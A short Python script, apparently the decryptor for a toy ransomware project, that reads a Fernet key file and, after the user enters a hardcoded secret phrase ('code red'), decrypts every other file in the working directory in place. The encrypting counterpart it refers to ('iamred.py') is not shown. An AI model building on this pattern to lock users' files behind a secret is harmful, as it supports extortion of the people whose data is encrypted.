#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
        if file == "iamred.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)
print(files)


with open("thekey.key","rb") as thekey:
	secret_key = thekey.read()

s_phrase = "code red"
u_phrase =input("enter the secret phrase to decrypt files\n")
if u_phrase == s_phrase:
	for file in files:
		with open(file,"rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secret_key).decrypt(contents)
		with open(file,"wb") as thefile:
			thefile.write(contents_decrypted)
	print("congrats\n")
else:
	print("varen da aiyasamy")
